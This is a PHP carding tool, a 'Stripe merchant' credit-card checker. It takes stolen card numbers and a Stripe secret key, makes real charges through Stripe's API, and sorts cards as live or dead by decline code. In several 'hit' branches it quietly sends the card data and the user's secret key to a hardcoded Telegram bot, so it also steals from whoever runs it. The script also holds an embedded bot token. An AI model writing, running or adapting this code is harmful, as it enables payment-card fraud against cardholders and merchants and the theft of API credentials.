<?php


//===================== [ MADE BY HXSXSXSXS ] ====================//
#---------------[ STRIPE MERCHANTE PROXYLESS ]----------------#



error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


//================ [ FUNCTIONS & LISTA ] ===============//

function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}


function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };

$idd = $_GET['idd'];
$amt = $_GET['cst'];
if(empty($amt)) {
	$amt = '1';
}
$chr = $amt * 100;

$sk = $_GET['sec'];
$lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";





//================= [ CURL REQUESTS ] =================//

#-------------------[1st REQ]--------------------#
$x = 0;  
while(true)  
{  
$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');  
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');
$result1 = curl_exec($ch);  
$tok1 = Getstr($result1,'"id": "','"');  
$msg = Getstr($result1,'"message": "','"');  
//echo "<br><b>Result1: </b> $result1<br>";  
if (strpos($result1, "rate_limit"))   
{  
    $x++;  
    continue;  
}  
break;  
}  
  
#------------------[2nd REQ]--------------------#  
$x = 0;  
while(true)  
{  
$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');  
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=usd&payment_method_types[]=card&description=Custom Donation&payment_method='.$tok1.'&confirm=true&off_session=true');
$result2 = curl_exec($ch);  
$tok2 = Getstr($result2,'"id": "','"');  
$receipturl = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));
//echo "<br><b>Result2: </b> $result2<br>";  
if (strpos($result2, "rate_limit"))   
{  
    $x++;  
    continue;  
}  
break; 

}

//=================== [ RESPONSES ] ===================//

if(strpos($result2, '"seller_message": "Payment complete."' )) {
    echo '<font color="#4D8C57">𝐂𝐇𝐀𝐑𝐆𝐄𝐃</span></span> 𝘾𝙑𝙑: '.$lista.'</span>  <br>│𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ➠ $'.$amt.' 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ✅<br>│𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐁𝐘 :<a href="https://t.me/Hxmzzzx" class="link"> 𝐇𝐗𝐌𝐙𝐕𝐕♕</a> <br><a href='.$receipturl.'>↠ʀᴇᴄᴇɪᴘᴛ↞</a><br>';
    $tg2 = 
    "
      𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 ✅
      
     ┃𝘾𝘾 : <code>".$lista."</code>
     ┃ 𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀: 𝘾𝙃𝘼𝙍𝙂𝙀𝘿 ccn $amt  $
     
     ▛ 𝐒𝐊 𝐔𝐒𝐄𝐃 𝐁𝐘 𝐔𝐒𝐄𝐑 ▜ <code>".$sk."</code>";
     
     $apiToken = '5866484578:AAFgD8MCNolzeYLjOPszlT7pQHl86XhGxdM';
     $forward1 = ['chat_id' => '5652406167','text' => $tg2,'parse_mode' => 'HTML' ];
     $response1 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($forward1) );
    
}
elseif(strpos($result2,'"cvc_check": "pass"')){
    echo '<font color="#8B8000">𝐂𝐂𝐍/𝐂𝐕𝐕</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: CVV LIVE ✅  <br>│𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐁𝐘 :<a href="https://t.me/Hxmzzzx" class="link"> 𝐇𝐗𝐌𝐙𝐕𝐕♕</a> <br> <br>';

    $tg2 = 
    "
      𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 ✅
      
     ┃𝘾𝘾 : <code>".$lista."</code>
     ┃ 𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀: CVV LIVE ✅$amt
     
     ▛ 𝐒𝐊 𝐔𝐒𝐄𝐃 𝐁𝐘 𝐔𝐒𝐄𝐑 ▜ <code>".$sk."</code>";
     
     $apiToken = '5866484578:AAFgD8MCNolzeYLjOPszlT7pQHl86XhGxdM';
     $forward1 = ['chat_id' => '5652406167','text' => $tg2,'parse_mode' => 'HTML' ];
     $response1 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($forward1) );
    
}

elseif(strpos($result1, "generic_decline")) {
    echo '<center><font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾: '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: GENERIC DECLINED<br> <br>';
    }
elseif(strpos($result2, "generic_decline" )) {
    echo '<center><font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:   '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: GENERIC DECLINED<br> <br>';
}
elseif(strpos($result2, "insufficient_funds" )) {
    echo '<font color="#8B8000">𝐂𝐂𝐍/𝐂𝐕𝐕</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: INSUFFICIENT FUNDS <br>│𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐁𝐘 :<a href="https://t.me/Hxmzzzx" class="link"> 𝐇𝐗𝐌𝐙𝐕𝐕♕</a> <br> <br> ';
    $tg2 = 
    "
      𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 ✅
      
     ┃𝘾𝘾 : <code>".$lista."</code>
     ┃ 𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀: 𝘾𝙑𝙑 𝙄𝙉𝙎𝙐𝙁𝙄𝙎𝘾𝙄𝙀𝙉𝙏 𝙁𝙐𝙉𝘿𝙎
     
     ▛ 𝐒𝐊 𝐔𝐒𝐄𝐃 𝐁𝐘 𝐔𝐒𝐄𝐑 ▜ <code>".$sk."</code>";
     
     $apiToken = '5866484578:AAFgD8MCNolzeYLjOPszlT7pQHl86XhGxdM';
     $forward1 = ['chat_id' => '5652406167','text' => $tg2,'parse_mode' => 'HTML' ];
     $response1 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($forward1) );
     
}

elseif(strpos($result2, "fraudulent" )) {
    echo '<center><font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: FRAUDULENT<br> <br> ';
}
elseif(strpos($resul3, "do_not_honor" )) {
    echo '<center><font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: DO NOT HONOR <br><br>';
    }
elseif(strpos($resul2, "do_not_honor" )) {
    echo '<center><font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: DO NOT HONOR <br><br>';
}
elseif(strpos($result,"fraudulent")){
    echo '<<center>font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: FRAUDULENT <br><br> <br>';
}

elseif(strpos($result2,'"code": "incorrect_cvc"')){
    echo '<font color="green">𝐂𝐂𝐍/𝐂𝐕𝐕</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: Security code is incorrect <br>│𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐁𝐘 :<a href="https://t.me/Hxmzzzx" class="link"> 𝐇𝐗𝐌𝐙𝐕𝐕♕</a> <br> <br>';
    $tg2 = 
    "
      𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 ✅
      
     ┃𝘾𝘾 : <code>".$lista."</code>
     ┃ 𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀: 𝙄𝙉𝘾𝙊𝙍𝙍𝙀𝘾𝙏 𝘾𝙑𝘾
     
     ▛ 𝐒𝐊 𝐔𝐒𝐄𝐃 𝐁𝐘 𝐔𝐒𝐄𝐑 ▜ <code>".$sk."</code>";
     
     $apiToken = '5866484578:AAFgD8MCNolzeYLjOPszlT7pQHl86XhGxdM';
     $forward1 = ['chat_id' => '5652406167','text' => $tg2,'parse_mode' => 'HTML' ];
     $response1 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($forward1) );
     
    }   
elseif(strpos($result1,' "code": "invalid_cvc"')){
    echo '<font color="green">𝐂𝐂𝐍/𝐂𝐕𝐕</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: Security code is incorrect <br> <br> <br>';
     
}
elseif(strpos($result1,"invalid_expiry_month")){
    echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: INVAILD EXPIRY MONTH <br> <br> <br>';

}
elseif(strpos($result2,"invalid_account")){
    echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: INVAILD ACCOUNT <br><br>';

}

elseif(strpos($result2, "do_not_honor")) {
    echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: DO NOT HONOR <br><br>';
}
elseif(strpos($result2, "lost_card" )) {
    echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: LOST CARD<br<br>';
}
elseif(strpos($result2, "lost_card" )) {
    echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: LOST CARD</span></span>  <br>Result: CHECKER BY ʜxᴍᴢᴠᴠ :  <br><br>';
}

elseif(strpos($result2, "stolen_card" )) {
    echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: STOLEN CARD <br><br>';
    }

elseif(strpos($result2, "stolen_card" )) {
    echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: STOLEN CARD <br><br>';

}
elseif(strpos($result2, "transaction_not_allowed" )) {
    echo '<font color="#8B8000">𝐂𝐂𝐍/𝐂𝐕𝐕</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: TRANSACTION NOT ALLOWED  <br>│𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐁𝐘 :<a href="https://t.me/Hxmzzzx" class="link"> 𝐇𝐗𝐌𝐙𝐕𝐕♕</a> <br> <br>';
    $tg2 = 
    "
      𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 ✅
      
     ┃𝘾𝘾 : <code>".$lista."</code>
     ┃ 𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀: 𝘾𝙃𝘼𝙍𝙂𝙀𝘿 𝘾𝙑𝙑
     
      ▛ 𝐒𝐊 𝐔𝐒𝐄𝐃 𝐁𝐘 𝐔𝐒𝐄𝐑 ▜ ".$sk."";
     
     $apiToken = '5866484578:AAFgD8MCNolzeYLjOPszlT7pQHl86XhGxdM';
     $forward1 = ['chat_id' => '5652406167','text' => $tg2,'parse_mode' => 'HTML' ];
     $response1 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($forward1) );
     


}
    elseif(strpos($result2, "authentication_required")) {
    	echo '<font color="#8B8000">𝐂𝐂𝐍/𝐂𝐕𝐕</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: 32DS REQUIRED  <br> <br> <br>';
   } 
   elseif(strpos($result2, "card_error_authentication_required")) {
    	echo '<font color="#8B8000">𝐂𝐂𝐍/𝐂𝐕𝐕</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: 32DS REQUIRED  <br> <br> <br>';
   } 
   elseif(strpos($result2, "card_error_authentication_required")) {
    	echo '<font color="#8B8000">𝐂𝐂𝐍/𝐂𝐕𝐕</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: 32DS REQUIRED <br> <br> <br>';
   } 
   elseif(strpos($result1, "card_error_authentication_required")) {
    	echo '<font color="#8B8000">𝐂𝐂𝐍/𝐂𝐕𝐕</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: 32DS REQUIRED <br> <br> <br>';
   } 
elseif(strpos($result2, "incorrect_cvc" )) {
    echo '<font color="#8B8000">𝐂𝐂𝐍/𝐂𝐕𝐕</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: Security code is incorrect<br> <br> <br>';
}
elseif(strpos($result2, "pickup_card" )) {
    echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: PICKUP CARD <br><br>';
}
elseif(strpos($result2, "pickup_card" )) {
    echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: PICKUP CARD <br><br>';

}
elseif(strpos($result2, 'Your card has expired.')) {
    echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: EXPIRED CARD <br><br>';
}
elseif(strpos($result2, 'Your card has expired.')) {
    echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: EXPIRED CARD <br><br>';

}
elseif(strpos($result2, "card_decline_rate_limit_exceeded")) {
	echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: SK IS AT RATE LIMIT <br><br>';
}
elseif(strpos($result2, '"code": "processing_error"')) {
    echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: PROCESSING ERROR <br><br>';
    }
elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
    echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: YOUR CARD NUMBER IS INCORRECT <br><br>';
    }
elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
    echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: SERVICE NOT ALLOWED <br><br>';
    }
elseif(strpos($result2, '"code": "processing_error"')) {
    echo '<fonr color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: PROCESSING ERROR <br><br>';
    }
elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
    echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: YOUR CARD NUMBER IS INCORRECT <br><br>';
    }
elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
    echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: SERVICE NOT ALLOWED <br><br>';

}
elseif(strpos($result, "incorrect_number")) {
    echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: INCORRECT CARD NUMBER <br><br>';
}
elseif(strpos($result1, "incorrect_number")) {
    echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾: '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: INCORRECT CARD NUMBER <br><br>';


}elseif(strpos($result1, "do_not_honor")) {
    echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: DO NOT HONOR <br><br>';

}
elseif(strpos($result1, 'Your card was declined.')) {
    echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: CARD DECLINED <br><br>';

}
elseif(strpos($result1, "do_not_honor")) {
    echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: DO NOT HONOR <br><br>';
    }
elseif(strpos($result2, "generic_decline")) {
    echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>CC:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: GENERIC CARD <br><br>';
}
elseif(strpos($result, 'Your card was declined.')) {
    echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: CARD DECLINED <br><br>';

}
elseif(strpos($result2,' "decline_code": "do_not_honor"')){
    echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: DO NOT HONOR <br><br>';
}
elseif(strpos($result2,'"cvc_check": "unchecked"')){
    echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: CVC_UNCHECKED : INFORM AT OWNER <br> <br> <br>';
}
elseif(strpos($result2,'"cvc_check": "fail"')){
    echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: CVC_CHECK : FAIL <br> <br> <br>';
}
elseif(strpos($result2, "card_not_supported")) {
	echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: CARD NOT SUPPORTED <br> <br> <br>';
}
elseif(strpos($result2,'"cvc_check": "unavailable"')){
    echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: CVC_CHECK : UNVAILABLE <br> <br> <br>';
}
elseif(strpos($result2,'"cvc_check": "unchecked"')){
    echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: CVC_UNCHECKED : INFORM TO OWNER」 <br> <br> <br>';
}
elseif(strpos($result2,'"cvc_check": "fail"')){
    echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: CVC_CHECKED : FAIL <br> <br> <br>';
}
elseif(strpos($result2,"currency_not_supported")) {
	echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: CURRENCY NOT SUPORTED TRY IN INR <br> <br> <br>';
}

elseif (strpos($result,'Your card does not support this type of purchase.')) {
    echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span> 𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: CARD NOT SUPPORT THIS TYPE OF PURCHASE <br> <br> <br>';
    }

elseif(strpos($result2,'"cvc_check": "pass"')){
    echo '<font color="#8B8000">𝐂𝐂𝐍/𝐂𝐕𝐕</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: CVV LIVE https://t.me/Hxmzzzx <br> <br> <br>';
}
elseif(strpos($result2, "fraudulent" )) {
    echo '<center><font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: FRAUDULENT <br> <br> <br>';
}
elseif(strpos($result1, "testmode_charges_only" )) { 
    echo  '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: SK KEY DEAD OR INVALID <br> <br> <br>';
}
elseif(strpos($result1, "api_key_expired" )) {
    echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: SK KEY REVOKED <br> <br> <br>';
}
elseif(strpos($result1, "parameter_invalid_empty" )) {
    echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: ENTER CC TO CHECK<br> [𝙏𝙄𝙈𝙀 𝙏𝘼??𝙀𝙉 : '.$time.']<br> <br>';
}
elseif(strpos($result1, "card_not_supported" )) {
    echo '<font color="FD0E35">|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄: CARD NOT SUPPORTED <br> <br>'; 
}  
    else {
        echo '<center><font color="FD0E35">|𝘿𝙀𝘼𝘿</span> CC:  '.$lista.'</span>  <br>𝐔𝐒𝐄𝐃 𝐒𝐊 𝐈𝐒 𝐁𝐀𝐃 𝐎𝐑 𝐁𝐀𝐍𝐍𝐄𝐃 𝐈𝐏 𝐎𝐍 𝐒𝐊...😢</span><br><br>';
       
       
}

//echo "<br><b>Lista:</b> $lista<br>";
//echo "<br><b>CVV Check:</b> $cvccheck<br>";
//echo "<b>D_Code:</b> $dcode<br>";
//echo "<b>Reason:</b> $reason<br>";
//echo "<b>Risk Level:</b> $riskl<br>";
//echo "<b>Seller Message:</b> $seller_msg<br>";
//echo "<br><b>Result3: </b> $result2<br>";
curl_close($ch);
ob_flush();
?>